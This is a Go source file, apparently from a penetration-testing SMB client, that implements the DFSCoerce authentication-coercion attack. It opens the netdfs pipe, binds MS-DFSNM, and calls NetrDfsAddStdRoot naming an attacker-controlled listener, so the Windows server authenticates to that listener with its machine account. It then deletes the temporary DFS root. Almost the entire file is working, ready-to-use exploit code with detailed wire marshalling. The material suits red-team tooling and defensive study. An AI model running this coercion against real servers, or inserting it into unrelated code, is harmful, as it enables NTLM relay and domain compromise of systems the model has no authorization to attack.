package smbclient

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"unicode/utf16"

	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/smb"
)

// dfsnmUUID is the MS-DFSNM (DFS Namespace Management Protocol) interface,
// v3.0 over \pipe\netdfs — the UUID internal/scan/uuids.go flags as the
// DFSCoerce coercion target ("4fc742e0-4a10-11cf-8273-00aa004ae673").
var dfsnmUUID = dcerpc.MustParseUUID("4fc742e0-4a10-11cf-8273-00aa004ae673")

// MS-DFSNM opnums for the standalone namespace methods — spec §3.1.4.4.1
// NetrDfsAddStdRoot and §3.1.4.4.2 NetrDfsRemoveStdRoot (the method pages on
// learn.microsoft.com title them "(Opnum 12)" / "(Opnum 13)"). Cross-checked
// against the reference implementation dfscoerce.py
// (github.com/Wh04m1001/DFSCoerce), whose NDRCALL classes carry the same
// opnums and parameter lists, and the Coercer tool's MS-DFSNM methods.
const (
	opNetrDfsAddStdRoot    = 12
	opNetrDfsRemoveStdRoot = 13
)

// Namespace artifacts the trigger creates on the target. The values are
// arbitrary — the server SMB-connects to \\listener\<rootShare> while
// validating the new root target, before it would ever check the share
// exists, so anything syntactically valid fires the coercion. Coercer's
// canned NetrDfsAddStdRoot method uses exactly these ("share"/"x");
// dfscoerce.py uses "test" with no comment.
const (
	dfsRootShare = "share"
	dfsComment   = "x"
)

// CoerceDFSCoerce fires the DFSCoerce primitive (June 2022 disclosure, no
// CVE — Microsoft's position is that the interface requires admin, so it
// stays unpatched; 0patch issued a micropatch): NetrDfsAddStdRoot names
// listener as the root target of a new standalone DFS namespace, and the
// server validates that target by SMB-connecting to
// \\listener\share AS ITS OWN MACHINE ACCOUNT. That outbound authentication
// is the coercion; ListenForCallback catches it. The namespace is real state
// on the server, so NetrDfsRemoveStdRoot cleans it up once the Add returns.
//
// Needs admin on most Windows servers (ERROR_ACCESS_DENIED otherwise);
// Samba has no netdfs endpoint at all. A successful Add means the callback
// already fired, so a Remove failure is reported as a cleanup failure, not
// a coercion failure.
func (s *Session) CoerceDFSCoerce(listener string) error {
	if listener == "" {
		return fmt.Errorf("no listener address given")
	}

	pipe, err := s.client.OpenPipe("netdfs")
	if err != nil {
		return mapDFSCoerceError(fmt.Errorf("open netdfs pipe: %w", err))
	}
	defer pipe.Close()

	rpc := dcerpc.NewClient(pipe)
	if err := rpc.Bind(dfsnmUUID, 3, 0); err != nil {
		return mapDFSCoerceError(fmt.Errorf("bind DFSNM: %w", err))
	}

	if err := dfsAddStdRoot(rpc, listener); err != nil {
		return err
	}
	if err := dfsRemoveStdRoot(rpc, listener); err != nil {
		return fmt.Errorf("coercion fired, but removing the temporary DFS root failed: %v", err)
	}
	return nil
}

// dfsAddStdRoot is the trigger half: one NetrDfsAddStdRoot call with
// ServerName=listener, RootShare/Comment the fixed artifacts above. Per
// MS-DFSNM §3.1.4.4.1 the MIDL signature is
//
//	NET_API_STATUS NetrDfsAddStdRoot(
//	  [in, string] WCHAR* ServerName,   // host name of the new DFS root target
//	  [in, string] WCHAR* RootShare,    // root target share / namespace name
//	  [in, string] WCHAR* Comment,      // informational only
//	  [in] DWORD ApiFlags               // reserved, ignored by the server
//	);
func dfsAddStdRoot(rpc *dcerpc.Client, server string) error {
	resp, err := rpc.Call(opNetrDfsAddStdRoot, buildDfsAddStdRoot(server, dfsRootShare, dfsComment))
	if err != nil {
		return mapDFSCoerceError(fmt.Errorf("NetrDfsAddStdRoot: %w", err))
	}
	status, err := parseDfsReturn(resp)
	if err != nil {
		return fmt.Errorf("NetrDfsAddStdRoot: %v", err)
	}
	if status != 0 {
		return mapDFSCoerceError(fmt.Errorf("NetrDfsAddStdRoot returned 0x%08x", status))
	}
	return nil
}

// dfsRemoveStdRoot deletes the namespace the Add created (MS-DFSNM
// §3.1.4.4.2: ServerName/RootShare as above, no Comment, same reserved
// ApiFlags). dfscoerce.py sends ApiFlags=1 here; the spec marks the field
// reserved and ignored, and Windows accepts either — 0 is the documented
// value. The removal itself does not re-contact the listener on Windows
// (the namespace object is torn down locally), so a failure here is stale
// state, not a lost callback.
func dfsRemoveStdRoot(rpc *dcerpc.Client, server string) error {
	resp, err := rpc.Call(opNetrDfsRemoveStdRoot, buildDfsRemoveStdRoot(server, dfsRootShare))
	if err != nil {
		return mapDFSCoerceError(fmt.Errorf("NetrDfsRemoveStdRoot: %w", err))
	}
	status, err := parseDfsReturn(resp)
	if err != nil {
		return fmt.Errorf("NetrDfsRemoveStdRoot: %v", err)
	}
	if status != 0 {
		return mapDFSCoerceError(fmt.Errorf("NetrDfsRemoveStdRoot returned 0x%08x", status))
	}
	return nil
}

// buildDfsAddStdRoot marshals the NetrDfsAddStdRoot request stub: the three
// strings in declaration order, then ApiFlags=0. The interface's full IDL
// (MS-DFSNM §2.2.1) sets pointer_default(unique), so each [in, string]
// WCHAR* marshals as a non-NULL unique pointer followed by its referent —
// exactly how impacket's WSTR renders these params in dfscoerce.py, and the
// same shape gopacket's winreg string helper writes (see
// writeRRPUnicodeString in procs.go). Referent IDs follow the gopacket
// 0x20000+n*4 convention; only uniqueness matters on the wire.
func buildDfsAddStdRoot(server, share, comment string) []byte {
	buf := new(bytes.Buffer)
	writeDfsnmString(buf, 0x20000, server)
	writeDfsnmString(buf, 0x20004, share)
	writeDfsnmString(buf, 0x20008, comment)
	binary.Write(buf, binary.LittleEndian, uint32(0)) // ApiFlags — reserved
	return buf.Bytes()
}

// buildDfsRemoveStdRoot marshals the NetrDfsRemoveStdRoot request stub —
// ServerName/RootShare only, then ApiFlags=0.
func buildDfsRemoveStdRoot(server, share string) []byte {
	buf := new(bytes.Buffer)
	writeDfsnmString(buf, 0x20000, server)
	writeDfsnmString(buf, 0x20004, share)
	binary.Write(buf, binary.LittleEndian, uint32(0)) // ApiFlags — reserved
	return buf.Bytes()
}

// writeDfsnmString marshals one top-level [in, string] wchar_t*: 4-byte
// referent ID, then the conformant varying array — MaxCount/Offset/
// ActualCount in UTF-16 code units with the NUL terminator counted ([string]
// semantics, C706 §14.3: the terminator is transmitted), the UTF-16LE
// characters, and zero padding to 4-byte alignment so the next parameter
// (string or DWORD) starts aligned.
func writeDfsnmString(buf *bytes.Buffer, referent uint32, s string) {
	chars := utf16.Encode([]rune(s))
	chars = append(chars, 0)

	binary.Write(buf, binary.LittleEndian, referent)
	binary.Write(buf, binary.LittleEndian, uint32(len(chars))) // MaxCount
	binary.Write(buf, binary.LittleEndian, uint32(0))          // Offset
	binary.Write(buf, binary.LittleEndian, uint32(len(chars))) // ActualCount
	for _, c := range chars {
		binary.Write(buf, binary.LittleEndian, c)
	}
	if buf.Len()%4 != 0 {
		buf.Write(make([]byte, 4-buf.Len()%4))
	}
}

// parseDfsReturn reads the response stub of either StdRoot call. Neither has
// [out] parameters, so the stub IS the NET_API_STATUS return value — NDR
// marshals the return value last (dfscoerce.py models both responses as a
// lone ('ErrorCode', ULONG)).
func parseDfsReturn(resp []byte) (uint32, error) {
	if len(resp) < 4 {
		return 0, fmt.Errorf("short response (%d bytes)", len(resp))
	}
	return binary.LittleEndian.Uint32(resp[len(resp)-4:]), nil
}

// mapDFSCoerceError themes DFSCoerce failures (feature-local, like
// mapProcError). Three error shapes reach it: OpenPipe failures (matched
// with smb.IsNotFound — the %w wrap keeps the chain alive), bind rejections
// from pkg/dcerpc, and NET_API_STATUS / RPC-fault statuses whose hex is
// matched on its rendered form — dfsAddStdRoot/dfsRemoveStdRoot format bare
// "0x........" errors and pkg/dcerpc renders faults as
// "RPC Fault: status=0x........".
func mapDFSCoerceError(err error) error {
	msg := err.Error()
	switch {
	case smb.IsNotFound(err):
		// No \pipe\netdfs: Samba serves no DFSNM endpoint, and Windows
		// without the DFS Namespace service (dfssvc not installed/running)
		// doesn't either.
		return fmt.Errorf("DFSCoerce not supported on this server (no \\pipe\\netdfs)")
	case strings.Contains(msg, "bind rejected"):
		// The pipe answered but refused the DFSNM interface (nca_s_unk_if).
		return fmt.Errorf("DFSCoerce not supported on this server (DFSNM interface rejected the bind)")
	case strings.Contains(msg, "0x00000005"): // ERROR_ACCESS_DENIED
		return fmt.Errorf("access denied — DFSCoerce needs admin")
	case strings.Contains(msg, "0x1c010002"), // nca_s_op_rng_error — opnum not implemented
		strings.Contains(msg, "0x000006f7"): // EPT_S_NOT_REGISTERED
		return fmt.Errorf("DFSCoerce not supported on this server (DFSNM opnums unimplemented)")
	case strings.Contains(msg, "0x00000490"): // ERROR_NOT_FOUND — the namespace Remove was asked to delete isn't there
		return fmt.Errorf("DFS root not found on the server (already removed?)")
	}
	return err
}
